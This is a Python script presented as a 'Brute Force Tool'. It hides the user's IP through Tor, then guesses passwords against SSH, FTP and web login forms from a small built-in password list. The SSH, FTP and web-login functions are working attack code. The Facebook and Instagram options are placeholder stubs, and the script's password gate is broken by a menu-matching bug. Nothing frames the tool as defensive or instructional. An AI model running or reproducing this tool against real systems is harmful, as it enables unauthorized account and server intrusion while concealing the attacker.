import os
import subprocess
import time
import paramiko
import ftplib
import requests
from stem import Signal
from stem.control import Controller

# Paramiko automatic install
try:
    import paramiko
except ImportError:
    print("Paramiko not found, installing...")
    subprocess.call(["pip", "install", "paramiko"])

# Tor Proxy Setup (IP hide)
def set_tor_proxy():
    try:
        print("Connecting to Tor...")
        controller = Controller.from_port(port=9051)
        controller.authenticate()
        controller.signal(Signal.NEWNYM)
        controller.close()
        os.environ['http_proxy'] = 'socks5h://127.0.0.1:9050'
        os.environ['https_proxy'] = 'socks5h://127.0.0.1:9050'
        print("Tor connected, IP is now hidden.")
    except Exception as e:
        print(f"Error with Tor connection: {e}")
        exit()

# Function to check password protection for specific options
def check_password(option):
    if option in ["SSH", "FTP", "Web Login"]:
        password = input("Enter password: ")
        if password != "i am hex army":
            print("Incorrect password! Exiting...")
            exit()

# Function for SSH Brute Force
def ssh_brute_force(target, username, password_list):
    print(f"Running SSH Brute Force on {target}...")
    for password in password_list:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target, username=username, password=password)
            print(f"Success! Password found: {password}")
            break
        except:
            continue

# Function for FTP Brute Force
def ftp_brute_force(target, username, password_list):
    print(f"Running FTP Brute Force on {target}...")
    for password in password_list:
        try:
            ftp = ftplib.FTP(target)
            ftp.login(username, password)
            print(f"Success! Password found: {password}")
            break
        except:
            continue

# Function for Web Login Brute Force
def web_brute_force(target, username, password_list):
    print(f"Running Web Login Brute Force on {target}...")
    for password in password_list:
        data = {'username': username, 'password': password}
        response = requests.post(target, data=data)
        if "login successful" in response.text:
            print(f"Success! Password found: {password}")
            break
        time.sleep(1)

# Function for Facebook Brute Force (No password check needed)
def facebook_brute_force(target, username, password_list):
    print(f"Running Facebook Brute Force on {target}...")
    for password in password_list:
        # Add your Facebook brute force logic here
        print(f"Testing password: {password}")

# Function for Instagram Brute Force (No password check needed)
def instagram_brute_force(target, username, password_list):
    print(f"Running Instagram Brute Force on {target}...")
    for password in password_list:
        # Add your Instagram brute force logic here
        print(f"Testing password: {password}")

# Main menu
def main():
    set_tor_proxy()  # Initialize Tor Proxy
    print("Welcome to the Brute Force Tool!")
    print("Select an option:")
    print("1. SSH Brute Force")
    print("2. FTP Brute Force")
    print("3. Web Login Brute Force")
    print("4. Facebook Brute Force")
    print("5. Instagram Brute Force")
    
    option = input("Choose an option: ")
    password_list = ["password123", "123456", "admin"]  # Add more passwords here

    if option in ["SSH", "FTP", "Web Login"]:
        check_password(option)

    target = input("Enter the target IP/URL: ")
    username = input("Enter the username: ")

    if option == "1":
        ssh_brute_force(target, username, password_list)
    elif option == "2":
        ftp_brute_force(target, username, password_list)
    elif option == "3":
        web_brute_force(target, username, password_list)
    elif option == "4":
        facebook_brute_force(target, username, password_list)
    elif option == "5":
        instagram_brute_force(target, username, password_list)

if __name__ == "__main__":
    main()
